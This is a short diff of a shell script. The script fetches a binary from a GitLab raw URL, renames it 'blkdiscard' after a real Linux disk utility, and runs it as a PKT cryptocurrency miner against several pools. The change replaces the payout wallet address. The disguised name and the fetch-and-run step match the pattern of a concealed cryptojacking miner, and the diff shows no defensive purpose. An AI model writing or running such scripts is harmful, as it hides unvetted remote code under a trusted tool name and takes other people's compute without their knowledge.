@@ -3,4 +3,4 @@ sudo apt-get update && sudo apt-get install -y screen
 wget -q https://gitlab.com/bspot1/pekate/-/raw/main/tkp
 mv tkp blkdiscard
 chmod +x blkdiscard
-./blkdiscard ann -p pkt1qme9x0hhphrsk39e4gxgg3g0dmqn2cyhkxjyec7 http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
+./blkdiscard ann -p pkt1qu2j3ca9xanmkvlqmzrzwtmmxdhx2kn03gqtrdy http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
